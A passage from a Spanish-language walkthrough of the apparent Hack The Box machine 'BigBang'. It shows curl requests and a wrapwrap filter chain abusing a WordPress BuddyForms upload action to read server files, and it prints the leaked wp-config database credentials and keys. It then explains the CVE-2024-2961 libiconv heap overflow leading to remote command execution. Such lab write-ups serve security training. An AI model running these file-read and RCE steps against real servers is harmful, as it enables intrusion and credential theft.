 * You can have multiple installations <span class="token keyword">in</span> one database <span class="token keyword">if</span> you give each
 * a unique prefix. Only numbers, letters, and underscores please<span class="token operator">!</span>
<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string">'wp_'</span><span class="token punctuation">;</span>
 * For developers: WordPress debugging mode.
 * Change this to <span class="token boolean">true</span> to <span class="token builtin class-name">enable</span> the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * <span class="token keyword">in</span> their development environments.
 * For information on other constants that can be used <span class="token keyword">for</span> debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define<span class="token punctuation">(</span> <span class="token string">'WP_DEBUG'</span>, <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/* Add any custom values between this line and the <span class="token string">"stop editing"</span> line. */
/* That<span class="token string">'s all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( '</span>ABSPATH<span class="token string">' ) ) {
        define( '</span>ABSPATH<span class="token string">', __DIR__ . '</span>/<span class="token string">' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . '</span>wp-settings.php'<span class="token punctuation">;</span>


</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Confirmamos que es un container dado que la base de datos se encuentra alojada en la 172.17.0.1 que es un rango IP que usa docker por defecto; vamos a sacar el wp-settings.php</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ python3 wrapwrap.py <span class="token string">'../wp-settings.php'</span> <span class="token string">'GIF89a'</span> <span class="token string">''</span> <span class="token number">500000</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wrote filter chain to chain.txt <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1451</span><span class="token punctuation">)</span>.

<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb/wp-admin/admin-ajax.php'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-H</span> <span class="token string">'Content-Type: application/x-www-form-urlencoded'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token string">"action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=<span class="token variable">${evil_url}</span>"</span>

<span class="token punctuation">{</span><span class="token string">"status"</span><span class="token builtin class-name">:</span><span class="token string">"OK"</span>,<span class="token string">"response"</span><span class="token builtin class-name">:</span><span class="token string">"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-6.png"</span>,<span class="token string">"attachment_id"</span>:161<span class="token punctuation">}</span>%  

<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png'</span> <span class="token parameter variable">-o</span> wpsettings.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>  <span class="token number">3348</span>  <span class="token number">100</span>  <span class="token number">3348</span>    <span class="token number">0</span>     <span class="token number">0</span>   <span class="token number">1592</span>      <span class="token number">0</span>  <span class="token number">0</span>:00:02  <span class="token number">0</span>:00:02 --:--:--  <span class="token number">1592</span>
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ python3 wrapwrap.py <span class="token string">'../wp-settings.php'</span> <span class="token string">'GIF89a'</span> <span class="token string">''</span> <span class="token number">500000</span>
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ strings wpsettings.png 

GIF89a<span class="token operator">&lt;</span>?php
 * The base configuration <span class="token keyword">for</span> WordPress
 * The wp-config.php creation script uses this <span class="token function">file</span> during the installation.
 * You don<span class="token string">'t have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( '</span>DB_NAME<span class="token string">', '</span>wordpress<span class="token string">' );
/** Database username */
define( '</span>DB_USER<span class="token string">', '</span>wp_user<span class="token string">' );
/** Database password */
define( '</span>DB_PASSWORD<span class="token string">', '</span>wp_password<span class="token string">' );
/** Database hostname */
define( '</span>DB_HOST<span class="token string">', '</span><span class="token number">172.17</span>.0.1<span class="token string">' );
/** Database charset to use in creating database tables. */
define( '</span>DB_CHARSET<span class="token string">', '</span>utf8mb4<span class="token string">' );
/** The database collate type. Don'</span>t change this <span class="token keyword">if</span> <span class="token keyword">in</span> doubt. */
define<span class="token punctuation">(</span> <span class="token string">'DB_COLLATE'</span>, <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/**<span class="token comment">#@+</span>
 * Authentication unique keys and salts.
 * Change these to different unique phrases<span class="token operator">!</span> You can generate these using
 * the <span class="token punctuation">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="token punctuation">}</span>.
 * You can change these at any point <span class="token keyword">in</span> <span class="token function">time</span> to invalidate all existing cookies.
 * This will force all <span class="token function">users</span> to have to log <span class="token keyword">in</span> again.
 * @since <span class="token number">2.6</span>.0
define<span class="token punctuation">(</span> <span class="token string">'AUTH_KEY'</span>,         <span class="token string">'(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_KEY'</span>,  <span class="token string">'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_KEY'</span>,    <span class="token string">':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'NONCE_KEY'</span>,        <span class="token string">'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'AUTH_SALT'</span>,        <span class="token string">'_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_SALT'</span>, <span class="token string">'&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_SALT'</span>,   <span class="token string">'_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n['</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'NONCE_SALT'</span>,       <span class="token string">'t2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/**<span class="token comment">#@-*/</span>
 * WordPress database table prefix.
 * You can have multiple installations <span class="token keyword">in</span> one database <span class="token keyword">if</span> you give each
 * a unique prefix. Only numbers, letters, and underscores please<span class="token operator">!</span>
<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string">'wp_'</span><span class="token punctuation">;</span>
 * For developers: WordPress debugging mode.
 * Change this to <span class="token boolean">true</span> to <span class="token builtin class-name">enable</span> the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * <span class="token keyword">in</span> their development environments.
 * For information on other constants that can be used <span class="token keyword">for</span> debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define<span class="token punctuation">(</span> <span class="token string">'WP_DEBUG'</span>, <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/* Add any custom values between this line and the <span class="token string">"stop editing"</span> line. */
/* That<span class="token string">'s all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( '</span>ABSPATH<span class="token string">' ) ) {
        define( '</span>ABSPATH<span class="token string">', __DIR__ . '</span>/<span class="token string">' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . '</span>wp-settings.php'<span class="token punctuation">;</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">CVE-2024–2961 | Buffer Overflow</p></div><div class="el-p"><p dir="auto">Vamos a explotar la  vulnerabilidad <strong>CVE-2024–2961</strong> , un buffer overflow presente en la biblioteca GNU <code>libiconv</code>. Esta vulnerabilidad permite ejecución remota de código (RCE) debido a una mala validación de entrada durante la conversión entre conjuntos de caracteres. Aunque el exploit es complejo y requiere conocimientos avanzados de explotación binaria, intentaremos desglosarlo paso a paso para facilitar su comprensión.</p></div><div class="el-p"><p dir="auto">La vulnerabilidad fue descubierta en el contexto del plugin <strong>BuddyForms</strong> de WordPress, lo que la hace especialmente relevante para ataques web. Vamos a analizar cómo funciona esta vulnerabilidad desde una perspectiva técnica, centrándonos en los conceptos clave necesarios para su explotación.</p></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Vulnerabilidad: Buffer Overflow en `libiconv`" dir="auto" class="heading" id="Vulnerabilidad:_Buffer_Overflow_en_`libiconv`"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Vulnerabilidad: Buffer Overflow en <code>libiconv</code></h2><div class="heading-children"><div class="el-h3 heading-wrapper"><h3 data-heading="Contexto Técnico" dir="auto" class="heading" id="Contexto_Técnico"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Contexto Técnico</h3><div class="heading-children"><div class="el-p"><p dir="auto"><code>libiconv</code> es una biblioteca utilizada para convertir texto entre diferentes conjuntos de caracteres (charset). En PHP, muchas funciones de manipulación de cadenas dependen de esta biblioteca, especialmente cuando se usa la función <code>iconv()</code>. La vulnerabilidad radica en cómo <code>libiconv</code> maneja ciertos caracteres exóticos en el conjunto de caracteres <strong>ISO-2022-CN-EXT</strong> .</p></div><div class="el-h4 heading-wrapper"><h4 data-heading="¿Qué es ISO-2022-CN-EXT?" dir="auto" class="heading" id="¿Qué_es_ISO-2022-CN-EXT?"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>¿Qué es ISO-2022-CN-EXT?</h4><div class="heading-children"><div class="el-p"><p dir="auto">El conjunto de caracteres <strong>ISO-2022-CN-EXT</strong> utiliza secuencias de escape (<code>ESC</code> bytes, como <code>\x1B</code>) para cambiar dinámicamente entre diferentes codificaciones de caracteres. Cada carácter puede requerir hasta <strong>4 bytes</strong> :</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto"><strong>2 bytes</strong> para la secuencia de escape.</li>
<li data-line="1" dir="auto"><strong>2 bytes</strong> para el carácter codificado.</li>
</ul></div><div class="el-p"><p dir="auto">Por ejemplo:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">El carácter <code>劄</code> podría ser codificado como <code>ESC $ * H</code> (en formato hexadecimal: <code>\x1B\x24\x2A\x48</code>).</li>
</ul></div><div class="el-p"><p dir="auto">Cuando <code>libiconv</code> procesa estos caracteres, debe escribir 4 bytes en el búfer de salida. Sin embargo, <strong>falta una verificación adecuada del tamaño del búfer</strong> , lo que puede provocar un desbordamiento de búfer si no hay suficiente espacio disponible.</p></div></div></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="PHP Heap: Cómo Funciona" dir="auto" class="heading" id="PHP_Heap:_Cómo_Funciona"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>PHP Heap: Cómo Funciona</h3><div class="heading-children"><div class="el-p"><p dir="auto">Antes de profundizar en la explotación, es importante entender cómo funciona el manejo de memoria en PHP:</p></div><div class="el-h4 heading-wrapper"><h4 data-heading="1. **Asignación de Memoria**" dir="auto" class="heading" id="1._**Asignación_de_Memoria**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>1. <strong>Asignación de Memoria</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">PHP utiliza funciones como <code>emalloc(N)</code> para asignar bloques de memoria de tamaño <code>N</code> y devuelve un puntero a esa memoria. Cuando un bloque ya no es necesario, se libera con <code>efree(ptr)</code>.</p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="2. **Estructura del Montón (Heap)**" dir="auto" class="heading" id="2._**Estructura_del_Montón_(Heap)**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>2. <strong>Estructura del Montón (Heap)</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">El montón de PHP está dividido en regiones de <strong>2MB</strong> , subdivididas en páginas de <strong>4KB (0x1000 bytes)</strong> . Cada página almacena bloques (chunks) de un tamaño específico:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Página 10: Bloques de <strong>0x100 bytes</strong> .</li>
<li data-line="1" dir="auto">Página 11: Bloques de <strong>0x38 bytes</strong> .</li>
<li data-line="2" dir="auto">Y así sucesivamente...</li>
</ul></div><div class="el-p"><p dir="auto">No hay metadatos entre bloques para rastrear asignaciones, lo que lo hace eficiente pero vulnerable a desbordamientos, ya que no hay verificaciones de seguridad entre bloques en el montón.</p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="3. **Gestión de Listas Libres**" dir="auto" class="heading" id="3._**Gestión_de_Listas_Libres**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>3. <strong>Gestión de Listas Libres</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">Los bloques liberados se añaden a listas libres (free lists), que son listas enlazadas simples (inseguras comparadas con listas doblemente enlazadas). Cuando se llama a <code>efree(ptr)</code>, el bloque se agrega al inicio de la lista libre (comportamiento LIFO).</p></div><div class="el-p"><p dir="auto">Si ocurre un desbordamiento en un bloque adyacente, se puede sobrescribir el puntero almacenado en el primer byte del bloque libre, alterando la estructura de la lista libre. Esto permite controlar dónde se asignará el siguiente bloque, lo que es crítico para la explotación.</p></div><div class="el-hr"><hr></div></div></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="php://filter:" dir="auto" class="heading" id="php://filter:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>php://filter:</h3><div class="heading-children"><div class="el-p"><p dir="auto">El protocolo <code>php://filter</code> es ampliamente utilizado para aplicar filtros a recursos locales o remotos. Vamos a entender cómo PHP maneja este mecanismo:</p></div><div class="el-h4 heading-wrapper"><h4 data-heading="1. **Flujos y Cubetas (Streams and Buckets)**" dir="auto" class="heading" id="1._**Flujos_y_Cubetas_(Streams_and_Buckets)**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>1. <strong>Flujos y Cubetas (Streams and Buckets)</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">Cuando PHP lee un recurso (por ejemplo, <code>/etc/passwd</code>), lo carga en un flujo representado por una <strong>brigada de cubetas (bucket brigade)</strong> :</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Una brigada de cubetas es una lista enlazada doble de cubetas, donde cada cubeta contiene un búfer con una parte de los datos del recurso.</li>
<li data-line="1" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Ejemplo: <code>/etc/passwd</code> podría estar dividido en:
<ul>
<li data-line="2" dir="auto">Cubeta 1: Primeros 5 bytes.</li>
<li data-line="3" dir="auto">Cubeta 2: Siguientes 30 bytes.</li>
<li data-line="4" dir="auto">Cubeta 3: Siguientes 1000 bytes.</li>
</ul>
</li>
</ul></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="2. **Procesamiento de Filtros**" dir="auto" class="heading" id="2._**Procesamiento_de_Filtros**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>2. <strong>Procesamiento de Filtros</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">Los filtros (como <code>string.upper</code>) se aplican a las cubetas uno por uno:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">PHP procesa cada cubeta, asignando un búfer de salida del mismo tamaño que el búfer de entrada.</li>
<li data-line="1" dir="auto">Por ejemplo, si el filtro es <code>string.upper</code>, los caracteres minúsculos en el búfer de entrada se convierten a mayúsculas en el búfer de salida.</li>
<li data-line="2" dir="auto">Se crea una nueva cubeta para los datos procesados.</li>
</ul></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="3. **Cadena de Filtros**" dir="auto" class="heading" id="3._**Cadena_de_Filtros**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>3. <strong>Cadena de Filtros</strong></h4><div class="heading-children"><div class="el-p"><p dir="auto">Una vez que se procesa una cubeta con un filtro, se crea una nueva brigada de cubetas con los resultados. El siguiente filtro se aplica a esta nueva brigada. Este proceso continúa hasta que todos los filtros se han aplicado.</p></div><div class="el-p"><p dir="auto">Este mecanismo introduce potenciales vulnerabilidades:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Los filtros procesan datos en bloques, lo que los hace susceptibles a desbordamientos de búfer si las verificaciones de tamaño son insuficientes.</li>
<li data-line="1" dir="auto">Las cadenas de filtros aumentan la complejidad, permitiendo a los atacantes crear payloads intrincados.</li>
</ul></div><div class="el-hr"><hr></div></div></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Explotación del Desbordamiento" dir="auto" class="heading" id="Explotación_del_Desbordamiento"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Explotación del Desbordamiento</h3><div class="heading-children"><div class="el-p"><p dir="auto">Nuestro objetivo es aprovechar la vulnerabilidad de desbordamiento de búfer en el filtro <code>convert.iconv.XXX.ISO-2022-CN-EXT</code> para lograr ejecución remota de código (RCE).</p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="1. **Lectura Arbitraria de Archivos**" dir="auto" class="heading" id="1._**Lectura_Arbitraria_de_Archivos**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>1. <strong>Lectura Arbitraria de Archivos</strong></h3><div class="heading-children"><div class="el-p"><p dir="auto">Con la explotación anterior, obtenemos la capacidad de leer archivos arbitrarios. Esto nos permite:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Leer binaries críticos como PHP, Apache y bibliotecas compartidas (ejemplo: <code>libc</code>) para análisis.</li>
<li data-line="1" dir="auto">Filtrar la distribución de memoria (<code>/proc/self/maps</code>) para revelar la disposición de la memoria del proceso en ejecución. Esto evita ASLR (Randomización del Espacio de Direcciones) y PIE (Ejecutables Independientes de Posición).</li>
</ul></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="2. **Manipulación Arbitraria del Montón**" dir="auto" class="heading" id="2._**Manipulación_Arbitraria_del_Montón**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>2. <strong>Manipulación Arbitraria del Montón</strong></h3><div class="heading-children"><div class="el-p"><p dir="auto">A través del abuso de las cubetas, podemos asignar y liberar búferes casi arbitrariamente:</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Usar <code>zlib.inflate</code> para crear múltiples cubetas.</li>
<li data-line="1" dir="auto">Redimensionar las cubetas con <code>dechunk</code> para alinearlas con los tamaños de bloques en el montón (por ejemplo, 0x100).</li>
<li data-line="2" dir="auto">Manipular la lista libre mediante la asignación, liberación y sobrescritura de punteros.</li>
</ul></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="3. **Técnica de Muñeca Rusa**" dir="auto" class="heading" id="3._**Técnica_de_Muñeca_Rusa**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>3. <strong>Técnica de Muñeca Rusa</strong></h3><div class="heading-children"><div class="el-p"><p dir="auto">Esta técnica permite manipular las cubetas de manera precisa para preparar la explotación (pon que las cubetas son muñequitas rusas ):</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Lograr control total sobre qué escribir y dónde (<code>write-what-where</code>).</li>
<li data-line="1" dir="auto">Ejecutar comandos arbitrarios.</li>
</ul></div><div class="el-hr"><hr></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Flujo Final del Ataque" dir="auto" class="heading" id="Flujo_Final_del_Ataque"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Flujo Final del Ataque</h2><div class="heading-children"><div class="el-ol"><ol>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Solicitud 1</strong> : Leer <code>/proc/self/maps</code> para filtrar:</p>
<ul>
<li data-line="2" dir="auto">La disposición de memoria del proceso PHP (incluyendo la dirección del montón).</li>
<li data-line="3" dir="auto">La dirección base de <code>libc</code> para usar técnicas ROP.</li>
</ul>
</li>
<li data-line="5" dir="auto">
<p><strong>Solicitud 2</strong> : Descargar la versión coincidente de <code>libc</code> para extraer la dirección de la función <code>system()</code> y habilitar la ejecución de comandos arbitrarios con <code>system('/bin/sh')</code>.</p>
</li>
<li data-line="7" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Solicitud 3</strong> : Ejecutar el payload final:</p>
<ul>
<li data-line="9" dir="auto">Desencadenar el desbordamiento.</li>
<li data-line="10" dir="auto">Manipular el montón.</li>
<li data-line="11" dir="auto">Ejecutar el comando.</li>
</ul>
</li>
</ol></div><div class="el-h3 heading-wrapper"><h3 data-heading="Explicacion del Script:" dir="auto" class="heading" id="Explicacion_del_Script:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Explicacion del Script:</h3><div class="heading-children"><div class="el-h4 heading-wrapper"><h4 data-heading="**a) Class `Remote`**" dir="auto" class="heading" id="**a)_Class_`Remote`**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>a) Class <code>Remote</code></strong></h4><div class="heading-children"><div class="el-ul"><ul>
<li data-line="0" dir="auto">Implementa métodos para enviar solicitudes HTTP POST al endpoint vulnerable.</li>
<li data-line="1" dir="auto">Usa la cadena de filtros <code>chain_prefix</code> (los que usamos con wrapwrap) para engañar al sistema en la interpretación de datos.</li>
<li data-line="2" dir="auto">Permite descargar archivos remotos utilizando técnicas como <code>php://filter</code>.</li>
</ul></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong><code>check_vulnerable</code>:</strong></p>
<ul>
<li data-line="1" dir="auto">Comprueba si los wrappers <code>data://</code>, <code>php://filter</code> y la extensión <code>zlib</code> están habilitados.</li>
<li data-line="2" dir="auto">Si alguno de estos no está disponible, el exploit no funcionará.</li>
</ul>
</li>
